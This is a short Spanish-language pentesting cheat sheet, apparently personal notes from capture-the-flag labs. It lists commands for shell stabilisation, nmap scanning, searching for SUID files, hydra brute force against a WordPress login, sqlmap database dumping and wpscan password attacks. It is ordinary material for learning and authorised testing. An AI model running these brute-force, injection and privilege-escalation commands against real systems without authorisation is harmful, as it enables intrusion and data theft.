# COMANDOS MAS COMUNES PENTESTING 🚀

## Estabilizar shell 🔧
```
/usr/bin/script -qc /bin/bash /dev/null
Ctrl+z
stty raw -echo;fg
```
## NMAP básico 🔧
nmap -sC -sV -oN initial $IP

## Escalar priveligios 📖
```
cat /etc/crontab
```
Buscamos ficheros que con permiso SUID
	
SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
```
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```
Busqueda de ficheros ejecuables:
```
find / -type f -name "*.sh" 2>/dev/null
```

https://gtfobins.github.io/#

## Reverse shell 📖
https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/

## Técnicas varias 🔧
_Abrir terminal con python:_ 
```
python -c 'import pty;pty.spawn("/bin/bash")'
```
_Uso de hydra:_ 
```
hydra -L fsocity.dic -p test 10.10.192.186 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.186%2Fwp-admin%2F&testcookie=1:F=Invalid username' otra opción final: /S=302
```
_Encriptar gpg:_
```
gpg --list-keys --> listar claves
gpg --import /var/backup/root@harder.local.pub --> importar claves
gpg -er root command --> encryptar archivo con la clave
```
_Ver puertos abiertos:_
```
sudo netstat -tulpn | grep LISTEN
```
_sqlmap:
```
sqlmap -r request.txt --dbs -->traer bases de datos
sqlmap -r request.txt -D wordpress -tables --> traer tablas
sqlmap -r request.txt --dump -D "database" -T "tabla"
```
_wordpress:
```
wpscan --url site.wekor.thm/wordpress -e vp,vt,cb,u
wpscan --url http://site.wekor.thm/wordpress/-U user.txt -P /usr/share/wordlists/rockyou.txt -vv
```
_Open ports linux
```
ss -lntp
```
